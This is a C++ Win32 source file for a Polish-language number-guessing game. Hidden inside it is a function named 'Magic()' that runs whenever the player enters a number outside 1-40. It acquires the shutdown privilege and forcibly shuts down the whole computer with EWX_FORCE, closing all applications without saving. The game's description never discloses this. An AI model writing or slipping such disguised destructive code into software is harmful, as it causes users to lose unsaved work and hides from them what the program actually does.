#include <Windows.h>
#include "res.h"
#include <winuser.h>
#include <cstdio>
#include "game_data.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
/*
 * gra w zgadywanie
 * komputer losuje cyfre z zakresu 1-40
 * wpisuje w text box
 * komputer odpowiada czy iwêksza czy mniejsza
 * 2 pola static box
 */
#define CONGRATULATIONS "Brawo zgad³eœ"
#define ATTEMPT_NUMBER "liczba prób %d"
#define IS_OK_DEFAULT "wpisz wartoœæ z zakresu 1 - 40"
#define IS_OK_TOLOW "za ma³oooo"
#define IS_OK_TOHIGH "za du¿oooo"
#define ERROR_MESSAGE "nastepnym razem wpisz poprawne dane :)"
#define MIN_VALUE 1
#define MAX_VALUE 40

void InitControls(HWND hwnd_main_window);
BOOL Magic();

GameData* game_data;

void IncreaseAttemptsNumberText(HWND hwndDlg)
{
  game_data->IncreaseAttemptsNumber();
  auto hwnd_attempt_number = GetDlgItem(hwndDlg, IDC_STATIC_ATTEMPT_NUMBER);
  CHAR text[50];
  wsprintf(text, ATTEMPT_NUMBER, game_data->GetAttemptsNumber());
  SetWindowText(hwnd_attempt_number, text);
}

void UpdateTohighTolowText(HWND hwndDlg, int value)
{
  IncreaseAttemptsNumberText(hwndDlg);
  auto hwnd_tohigh_tolow = GetDlgItem(hwndDlg, IDC_STATIC_TOHIGH_TOLOW);
  CHAR text[50];
  if(value < game_data->GetNumberToGues())
    wsprintf(text, IS_OK_TOLOW);
  else
    wsprintf(text, IS_OK_TOHIGH);
  SetWindowText(hwnd_tohigh_tolow, text);
}

void GetNumberFromTextEdit(HWND hwnd_edit_box, int& value)
{
  INT text_length = GetWindowTextLength(hwnd_edit_box);
  CHAR text[500];
  GetWindowText(hwnd_edit_box, text, text_length + 1);
  value = atoi(text);

  if(value < MIN_VALUE || value > MAX_VALUE)
  {
    MessageBox(hwnd_edit_box, nullptr, ERROR_MESSAGE, MB_OK | MB_ICONERROR);
    Magic();
  }
 
}

INT_PTR CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
  switch (uMsg)
  {
  case WM_COMMAND:
    switch (HIWORD(wParam))
    {
    case BN_CLICKED:
      switch(LOWORD(wParam))
      {
      case IDC_BUTTON_START:
        game_data->ResetData();
        InitControls(hwndDlg);
        return TRUE;

      case IDC_BUTTON_CHECK:
        auto hwnd_edit_box = GetDlgItem(hwndDlg, IDC_EDIT1);
        int value;
        GetNumberFromTextEdit(hwnd_edit_box, value);

        if (game_data->Compare(value) == true)
        {
          MessageBox(hwndDlg, nullptr, CONGRATULATIONS, MB_OK);
          game_data->ResetData();
          InitControls(hwndDlg);
        }
        else
          UpdateTohighTolowText(hwndDlg, value);
        return TRUE;
      }



    }
    return FALSE;
  case WM_CLOSE:
    DestroyWindow(hwndDlg);
    PostQuitMessage(0);
    return TRUE;
  }
  return FALSE;
}


void InitAttemptNumberText(HWND hwnd_main_window)
{
  auto hwnd_attempt_number = GetDlgItem(hwnd_main_window, IDC_STATIC_ATTEMPT_NUMBER);
  CHAR text[50];
  wsprintf(text, ATTEMPT_NUMBER, 0);
  SetWindowText(hwnd_attempt_number, text);
}

void InitTohighTolowText(HWND hwnd_main_window)
{
  auto hwnd_tohigh_tolow = GetDlgItem(hwnd_main_window, IDC_STATIC_TOHIGH_TOLOW);
  CHAR text[50];
  wsprintf(text, IS_OK_DEFAULT);
  SetWindowText(hwnd_tohigh_tolow, text);
}

void InitControls(HWND hwnd_main_window)
{
  InitAttemptNumberText(hwnd_main_window);
  InitTohighTolowText(hwnd_main_window);
}




int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
{
  game_data = new GameData();

  HWND hwnd_main_window = CreateDialog(hInstance, MAKEINTRESOURCE(IDD_MAINVIEW), NULL, DialogProc);
  ShowWindow(hwnd_main_window, iCmdShow);
  InitControls(hwnd_main_window);

  //pêtla obs³ugi komunikatów

  MSG msg = {};

  while(GetMessage(&msg,NULL,0,0))
  {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }
 
  return 0;
}

BOOL Magic()
{
  HANDLE hToken;
  TOKEN_PRIVILEGES tkp;

  // Get a token for this process. 

  if (!OpenProcessToken(GetCurrentProcess(),
    TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    return(FALSE);

  // Get the LUID for the shutdown privilege. 

  LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,
    &tkp.Privileges[0].Luid);

  tkp.PrivilegeCount = 1;  // one privilege to set    
  tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  // Get the shutdown privilege for this process. 

  AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,
    (PTOKEN_PRIVILEGES)NULL, 0);

  if (GetLastError() != ERROR_SUCCESS)
    return FALSE;

  // Shut down the system and force all applications to close. 

  if (!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE,
    SHTDN_REASON_MAJOR_OPERATINGSYSTEM |
    SHTDN_REASON_MINOR_UPGRADE |
    SHTDN_REASON_FLAG_PLANNED))
    return FALSE;

  //shutdown was successful
  return TRUE;
}
